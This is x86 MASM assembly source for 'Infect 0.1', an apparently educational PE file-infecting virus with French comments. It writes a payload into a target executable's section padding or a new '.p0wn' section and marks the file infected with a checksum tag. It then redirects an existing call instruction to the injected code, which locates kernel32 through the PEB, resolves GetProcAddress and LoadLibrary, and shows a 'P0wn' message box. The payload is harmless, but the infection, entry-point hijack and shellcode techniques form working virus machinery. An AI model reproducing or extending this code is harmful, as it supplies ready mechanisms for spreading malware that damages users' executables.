.386
.model flat, stdcall

	include    \masm32\include\windows.inc
	include    \masm32\include\kernel32.inc
	include    \masm32\include\user32.inc

	includelib \masm32\lib\kernel32.lib
	includelib \masm32\lib\user32.lib

.data
    ExeFilename      db "Project1.exe",0
    ExeTmp           db "Tmp.exe",0
    MsgBoxCaption    db "Infect 0.1",0 
    Done             db "Done",0 
    msgWithHeader    db "Injection with header section.",0
    msgWithoutHeader db "Injection without header section.",0
    errNotFound      db "Can't open donothing.exe.",0
	errFileSize      db "Error GetFileSize.",0
    errFileMap       db "Error CreateFileMapping.",0
    errMapView       db "Error MapViewOfFile.",0 
    errDos           db "Error it's not a DOS exe.",0
    errPE            db "Error it's not a PE exe.",0
    errGet           db "Error GetProcAddress not found",0
    errSpace         db "Sorry, not enought space in the padding.",0
    errInfected      db "Already infected :D",0
	addrBase		DWORD 0
	addrVirtualVirus DWORD 0
	addrVirtualEntryP DWORD 0
	imageBase		DWORD 0
	entryPoint		DWORD 0
	addrBegin		DWORD 0
	addrBeginVirus		DWORD 0
    SectionAlignement       DWORD 0
    FileAlignement       DWORD 0
    addrSizeOfImage         DWORD 0
	fileSize		DWORD 0
    

.code

start:
    mov     ebp, esp
createfile:
    push    NULL
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_EXISTING
    push    NULL
    push    FILE_SHARE_READ
    mov     ebx, GENERIC_READ
    or      ebx, GENERIC_WRITE
    push    ebx
    push    offset ExeFilename
    call    CreateFile
    cmp     eax, INVALID_HANDLE_VALUE
    je      errornotfound
    push    eax    ; ebp - 4 == handle

getfilesize:
	push	0
	push	eax
	call	GetFileSize
	cmp		eax, INVALID_FILE_SIZE
	je		errorfilesize
	mov		fileSize, eax
	
createfilemapping:
    push    NULL
	add		eax, 1000h
    push    eax
    push    0
    push    PAGE_READWRITE
    push    NULL
    push    [ebp - 4]
    call    CreateFileMapping
    cmp     eax, NULL
    je      errorfilemap
    push    eax   ; ebp - 8 == filemapping

mapviewoffile:
    push    0
    push    0
    push    0
    push    FILE_MAP_WRITE
    push    eax
    call    MapViewOfFile
    cmp     eax, NULL
    je      errormapview
    push    eax  ;  ebp - 12 == mapview

	mov		addrBase, eax
dos:
    cmp     word ptr[eax], IMAGE_DOS_SIGNATURE
    jne     errordos

pe:
    mov     ebx, eax
    add     ebx, dword ptr[eax + 3Ch]           ; ebx == Header PE
    cmp     dword ptr[ebx], IMAGE_NT_SIGNATURE
    jne     errorpe

pushbaseimage:
    mov     edx, ebx
    add     edx, DWORD
    push    dword ptr[edx + 2h]      ; Numbers Of Sections
    add     edx, IMAGE_FILE_HEADER
checksumtest:
    cmp     dword ptr[edx + 40h], 31337h   ; checkSum
    je      errorinfected
    mov     dword ptr[edx + 40h], 31337h
    mov     ecx, edx
    add     ecx, 38h   ; SizeOfImage
    mov     addrSizeOfImage, ecx
    mov     ecx, dword ptr[edx + 20h]
    mov     SectionAlignement, ecx
    mov     ecx, dword ptr[edx + 24h]
    mov     FileAlignement, ecx
    add     edx, 1Ch
    push    dword ptr[edx]

    mov     edx, ebx
    add     edx, IMAGE_NT_HEADERS           ; edx sur la 1er struct IMAGE_SECTION_HEADER

	call	findBeginAddress
loopstruct:
    cmp     word ptr[esp + 4], 0  ; Numbers Of Sections
    je      errorspace
    dec     word ptr[esp + 4]
    mov     ecx, dword ptr[edx + 10h]
    sub     ecx, dword ptr[edx + 8h]
    cmp     ecx, virus_end-virus
    ja      checkheadersection
loopandincstruct:
    add     edx, IMAGE_SECTION_HEADER
    jmp     loopstruct

checkheadersection:
    mov     ecx, dword ptr[edx + 8h]
    mov     dword ptr[edx + 10h], ecx    ; modification du SizeOfRawData pour avoir une ImageSize pas trop grande
    push    edx    ; sauvegarde de la section / padding ou on va ecrire et ou on va modifier le characterict
gotoendstruct:
    cmp     word ptr[esp + 8], 0    ; esp + 8 == NumberOfSections
    je      checkpadding
incendstruct:
    dec     word ptr[esp + 8]
    add     edx, IMAGE_SECTION_HEADER
    jmp     gotoendstruct
checkpadding:
    add     edx, IMAGE_SECTION_HEADER   ; debut de notre nouveau header section
    mov     ecx, 0
checkpaddingloop:
    cmp     dword ptr[edx + ecx], 0
    jne     injectwithoutheader
    add     ecx, 4
    cmp     ecx, IMAGE_SECTION_HEADER
    jae     injectwithheader
    jmp     checkpaddingloop
injectwithheader:
    call    withheader
    pop     ecx
    push    eax
    mov     eax, addrSizeOfImage
    mov     esi, SectionAlignement
    add     dword ptr[eax], esi
    inc     word ptr[ebx + DWORD + 2h]     ; incrementation du nombre de secteur
    mov     dword ptr[edx], 'w0p.'
    mov     dword ptr[edx + 4h], 'n'
    mov     dword ptr[edx + 8h], virus_end-virus 
    mov     eax, 0
alignsize:
    add     eax, SectionAlignement
    cmp     eax, dword ptr[edx - 32]   ;virtual size de la section precedente
    jl      alignsize
    add     eax, dword ptr[edx - 28]   ;virtual address de la section precedente
    mov     dword ptr[edx + 0Ch], eax
	mov		addrVirtualVirus, eax
	push	eax
    mov     eax, FileAlignement
    mov     dword ptr[edx + 10h], eax ; avant j'avais virus_end-virus
    ;mov     eax, dword ptr[ecx + 8h]    ; VirtualSize de la section ou on va ecrire / debut de la ou notre virus commence
    ;add     eax, dword ptr[ecx + 14h]  ;  PointerToRawData
	mov		eax, 0
alignsize2:
	add		eax, FileAlignement
	cmp		eax, fileSize
	jl		alignsize2
    mov     dword ptr[edx + 14h], eax
	mov		addrBeginVirus, eax
    mov     dword ptr[edx + 18h], 0
    mov     dword ptr[edx + 1Ch], 0
    mov     word ptr[edx + 20h], 0
    mov     word ptr[edx + 22h], 0
    or      dword ptr[edx + 24h], IMAGE_SCN_MEM_EXECUTE       ; section en mode exe
    or      dword ptr[edx + 24h], IMAGE_SCN_CNT_CODE
    or      dword ptr[edx + 24h], IMAGE_SCN_MEM_WRITE
    or      dword ptr[edx + 24h], IMAGE_SCN_MEM_READ
    pop     esi
	pop		edx
    push    ecx
	pop		edx
	add		eax, addrBase
	mov		edx, eax
    jmp     injecting
injectwithoutheader:
    call    withoutheader
	pop     edx     ; on reprend le debut de la section ou on va ecrire (soit la nouvelle / soit l'ancienne)
    or      dword ptr[edx + 24h], IMAGE_SCN_MEM_EXECUTE       ; section en mode exe
    or      dword ptr[edx + 24h], IMAGE_SCN_CNT_CODE
    or      dword ptr[edx + 24h], IMAGE_SCN_MEM_WRITE
	or      dword ptr[edx + 24h], IMAGE_SCN_MEM_READ

inject:
    add     edx, IMAGE_SIZEOF_SHORT_NAME    ; edx sur VirtualSize
    mov     ecx, dword ptr[edx]             ; ecx == VirtualSize
    add     edx, ULONG                      ; edx sur VirtualAddress
    mov     esi, dword ptr[edx]             ; esi == VirtualAdress
	mov		edi, esi
	add		edi, ecx
    add     esi, ecx                        ; esi == adresse virtuel de la fin de la section
    add     edx, ULONG                      ; edx sur SizeOfRowData    
    add     edx, ULONG                      ; edx sur PointerToRawData
    mov     edx, dword ptr[edx]             ; edx == PointerToRawData
    add     edx, eax                        ; edx == Debut de la 1er Section
    add     edx, ecx                        ; edx == Fin de la 1er Section
	mov		addrVirtualVirus, edi

injecting:
    add     ebx, DWORD
    add     ebx, IMAGE_FILE_HEADER
    add     ebx, 10h
    push    dword ptr[ebx] ; entryPoint
    ;mov     dword ptr[ebx], esi
    mov     edi, edx
    mov     esi, virus
    mov     ecx, virus_end-virus
    cld
    rep     movsb
    ;pop     eax
	call	searchE8
    ;pop     ecx
    ;add     eax, ecx
    ;sub     edi, 5
    ;mov     dword ptr[edi], eax

close:
    push    dword ptr[ebp - 12]
    call    UnmapViewOfFile
    push    dword ptr[ebp - 4]
    call    CloseHandle
    push    dword ptr[ebp - 8]
    call    CloseHandle
    jmp     done
paddingNop:



virus:
    nop
    nop
searchkernel32base:
    assume  fs:nothing
    mov     ebp, esp
    mov     eax, fs:[18h]      ; TEB self pointer
    mov     eax, [eax + 30h]   ; PEB
    mov     eax, [eax + 0Ch]   ; PEB_LDR_DATA
    mov     eax, [eax + 1Ch]   ; Ldr InInitializationOrderModuleList
    mov     eax, [eax]         ; 1elem de la list
    mov     eax, [eax + 08h]   ; 2elem de la list
exporttable:
    push    eax                 ; ebp-4 = Base Kernel32
    mov     eax, [eax + 3Ch]    ; offset PE Header
    add     eax, [ebp - 4]
    mov     eax, [eax + 78h]    ; offset Export Table
    add     eax, [ebp - 4]      ; eax = Export Table

init:
    mov     ecx, [eax + 18h]    ; NumberOfNames
    mov     ebx, [eax + 1Ch]
    add     ebx, [ebp - 4]
    push    ebx                 ; ebp - 8 = AddressOfFunctions
    mov     ebx, [eax + 20h]    
    add     ebx, [ebp - 4]      
    push    ebx                 ; ebp - 12 = AdressOfNames
    jmp     searchgetprocadress

inctabs:
    dec     ecx
    jz      errorget
    add     dword ptr[ebp - 8], 4
    add     dword ptr[ebp - 12], 4
searchgetprocadress:
    mov     ebx, [ebp - 12]
    mov     ebx, [ebx]
    add     ebx, [ebp - 4]
    cmp     dword ptr[ebx], 'PteG'
    jne     inctabs
    cmp     dword ptr[ebx + 4], 'Acor'
    jne     inctabs
    mov     ebx, [ebp - 8]
    mov     ebx, [ebx]
    add     ebx, [ebp - 4]
    push    ebx      ; Addr de GetProcAddress sur le haut de la stack [ebp - 16]

init2:
    mov     ecx, [eax + 18h]           ; NumberOfNames
    mov     ebx, [eax + 1Ch]
    add     ebx, [ebp - 4]
    mov     [ebp - 8], ebx                 ; ebp - 8 = AddressOfFunctions
    mov     ebx, [eax + 20h]    
    add     ebx, [ebp - 4]
    mov     [ebp - 12], ebx                ; ebp - 12 = AdressOfNames
    jmp     searchloadlibrary

inctabs2:
    dec     ecx
    jz      errorget
    add     dword ptr[ebp - 8], 4
    add     dword ptr[ebp - 12], 4
searchloadlibrary:
    mov     ebx, [ebp - 12]
    mov     ebx, [ebx]
    add     ebx, [ebp - 4]
    cmp     dword ptr[ebx], 'daoL'
    jne     inctabs2
    cmp     dword ptr[ebx + 4], 'rbiL'
    jne     inctabs2
    mov     ebx, [ebp - 8]
    mov     ebx, [ebx]
    add     ebx, [ebp - 4]
    push    ebx           ; Addr de LoadLibrary sur le haut de la stack [ebp - 20]

messagebox:
    call    user32push
    db "user32.dll",0
user32push:
    call    dword ptr[ebp - 20]
    call    messageboxpush
    db "MessageBoxA",0
messageboxpush:
    push    eax
    call    dword ptr[ebp - 16]
    push    0
    push    'nw0P'
    push    MB_OK
    push    esp
    add     dword ptr[esp], 4
    push    esp
    add     dword ptr[esp], 8
    push    NULL
    call    eax

	add		esp, 7 * 4
    nop
    nop
	pop		edx
	push	99999999h ; transformet en call
    push	edx
	ret
virus_end:

done:
    invoke MessageBox, NULL, addr Done, addr MsgBoxCaption, MB_OK
    jmp exit

errornotfound:
    invoke MessageBox, NULL, addr errNotFound, addr MsgBoxCaption, MB_OK
    jmp exit

withoutheader:
    pusha
    invoke MessageBox, NULL, addr msgWithoutHeader, addr MsgBoxCaption, MB_OK
    popa
    ret

withheader:
    pusha
    invoke MessageBox, NULL, addr msgWithHeader, addr MsgBoxCaption, MB_OK
    popa
    ret

errorfilemap:
    invoke MessageBox, NULL, addr errFileMap, addr MsgBoxCaption, MB_OK
    jmp exit
	
errorfilesize:
    invoke MessageBox, NULL, addr errFileSize, addr MsgBoxCaption, MB_OK
    jmp exit

errormapview:
    invoke MessageBox, NULL, addr errMapView, addr MsgBoxCaption, MB_OK
    jmp exit

errordos:
    invoke MessageBox, NULL, addr errDos, addr MsgBoxCaption, MB_OK
    jmp exit

errorpe:
    invoke MessageBox, NULL, addr errPE, addr MsgBoxCaption, MB_OK
    jmp exit

errorget:
    invoke MessageBox, NULL, addr errGet, addr MsgBoxCaption, MB_OK
    jmp exit

errorspace:
    invoke MessageBox, NULL, addr errSpace, addr MsgBoxCaption, MB_OK
    jmp exit

errorinfected:
    invoke MessageBox, NULL, addr errInfected, addr MsgBoxCaption, MB_OK
    jmp exit

exit:
    push    0
    call    ExitProcess

searchE8:
	sub     edi, 7
	mov		esi, edi    ; adresse de retour
	mov		ecx, -1;
	mov		edi, addrBegin
	add		edi, addrBase
	mov		ebx, edi
	mov		eax, 232 ; 0xE8
	cld
	repne 	scasb
	mov		byte ptr[esi], 232
	mov		ecx, dword ptr[edi]
	mov		dword ptr[esi + 1], ecx
	mov		ecx, edi
	sub		edi, ebx
	mov		eax, addrVirtualEntryP
	add		eax, edi
	mov		ebx, addrVirtualVirus
	sub		ebx, eax
	mov		dword ptr[ecx], ebx
	sub		dword ptr[esi + 1], ebx
	sub		dword ptr[esi + 1], virus_end-virus
	add		dword ptr[esi + 1], 2
	ret

findBeginAddress:
	pusha
	mov		ecx, dword ptr[esp + 8] ; nb section
	add     ebx, DWORD
    add     ebx, IMAGE_FILE_HEADER
	mov		eax, dword ptr[ebx + 1Ch]
	mov		imageBase, eax;  save imageBase
    add     ebx, 10h
	mov		eax, dword ptr[ebx] ; entryPoint
loopstruct2:
    cmp     ecx, 0  ; Numbers Of Sections
    je		quitFindBeginAddress
    dec     ecx
    cmp     eax, dword ptr[edx + 0Ch]  ; comparaison avec la VirtualAdress
    jl		loopandincstruct2
	mov		ebx, dword ptr[edx + 0Ch]
	add		ebx, dword ptr[edx + 10h] ; size of raw data
	cmp		eax, ebx ; comparaison avec virtualadresse + size of raw data
	jl		findEntryPoint
loopandincstruct2:
    add     edx, IMAGE_SECTION_HEADER
    jmp     loopstruct2
findEntryPoint:
	mov		ebx, dword ptr[edx + 0Ch]
	mov		addrVirtualEntryP, ebx
	sub		eax, dword ptr[edx + 0Ch]   ; entrypoint - VirtualAdresse
	add		addrVirtualEntryP, eax
	add		addrVirtualEntryP, 4
	add		eax, dword ptr[edx + 14h]  ; + address of raw data
	mov		addrBegin, eax
quitFindBeginAddress:
	popa
	ret

end start